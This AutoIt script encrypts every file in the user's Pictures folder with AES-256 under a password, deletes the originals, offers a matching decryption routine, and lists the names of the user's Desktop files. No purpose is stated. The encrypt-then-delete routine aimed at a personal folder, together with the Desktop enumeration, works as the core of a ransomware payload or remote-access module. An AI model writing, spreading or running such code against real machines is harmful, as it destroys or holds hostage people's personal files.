#include <Crypt.au3>
#include <File.au3>

;Encrypt the files in the Pictures directory - ex:
;Encrypt("password")
Func EncryptPictures($password)
    ; List all the files in the Pictures directory
	$filePath = _PathFull("Pictures",@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_EncryptFile($filePath & "/" & $files[$i],$filePath & "/" & $files[$i] & ".crypt", $password, $CALG_AES_256)
	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
EndFunc

;Decrypt the files in the Pictures directory - ex:
;Decrypt("password")
Func DecryptPictures($password)
    ; List all the files in the Pictures directory
	$filePath = _PathFull("Pictures",@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_DecryptFile($filePath & "/" & $files[$i],$filePath & "/" & stringtrimright($files[$i], 6 ), $password, $CALG_AES_256)
 	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
 EndFunc

;get list of the files in the Desktop
Func ListDesktopFiles()
   local $buffer = ""
   $FileList =_FileListToArray(@DesktopDir)
	  For $i = 1 To $FileList[0]
		 $buffer =  $buffer &  @CRLF & $FileList[$i]
	  Next
   Return $buffer
EndFunc

